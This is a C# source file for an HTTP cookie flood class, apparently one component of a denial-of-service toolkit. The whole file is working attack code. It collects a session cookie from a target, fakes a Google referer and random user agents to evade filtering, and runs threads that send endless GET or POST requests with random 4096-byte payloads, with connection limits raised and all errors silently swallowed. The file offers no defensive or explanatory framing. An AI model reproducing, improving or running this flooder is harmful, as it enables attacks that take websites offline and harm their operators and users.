using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Cache;
using System.Text;
using System.Threading;


    class HttpCookieFlood
    {
        public static string Host;
        public static bool IsEnabled;
        public static int requestsPerThread = 5;
        public static int interval = 300;
        public static string method = "";
        public static byte[] postData;

        public static CookieContainer CookieJar;
        
        public static void GrabCookies()
        {
            try
            {
                CookieJar = new CookieContainer();
                HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(Host);
                request.ContentType = "application/x-www-form-urlencoded";
                request.Referer = "http://www.google.com/";
                request.UserAgent = Tools.GenerateRandomUserAgent();
                request.CookieContainer = CookieJar;

                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
            }
            catch { }
        }

        public static void WorkerThread()
        {
            List<HttpWebRequest> connectionList = new List<HttpWebRequest>();

            for (int i = 0; i <= requestsPerThread - 1; i++)
            {
                HttpWebRequest tempReq = (HttpWebRequest)HttpWebRequest.Create(Host);
                connectionList.Add(tempReq);
            }

            while (IsEnabled)
            {
                for (int i = 0; i <= requestsPerThread - 1; i++)
                {
                    try
                    {
                        connectionList[i] = (HttpWebRequest)HttpWebRequest.Create(Host);
                        connectionList[i].UserAgent = Tools.GenerateRandomUserAgent();
                        connectionList[i].CookieContainer = CookieJar;
                        connectionList[i].Method = method;
                        connectionList[i].ContentType = "application/x-www-form-urlencoded";
                        connectionList[i].ServicePoint.ConnectionLimit = 10000;

                        if (method == "POST")
                        {
                            if (postData.Length == 1)
                            {
                                postData = Tools.GenerateRandomPacket(4096);
                            }

                            connectionList[i].ContentLength = postData.Length;
                            Stream dataStream = connectionList[i].GetRequestStream();
                            dataStream.Write(postData, 0, postData.Length);
                        }

                        connectionList[i].BeginGetResponse(GetResponseCallback, connectionList[i]);
                    }
                    catch
                    {
                    }
                }
                Thread.Sleep(interval);
            }
        }

        private static void GetResponseCallback(IAsyncResult ar)
        {
            HttpWebRequest asyncReq = ar.AsyncState as HttpWebRequest;

            try
            {
                using (WebResponse resp = asyncReq.EndGetResponse(ar))
                {
                    resp.GetResponseStream();
                    resp.Close();
                    asyncReq = null;
                }
                GC.Collect();
            }

            catch
            {
            }
        }
    }
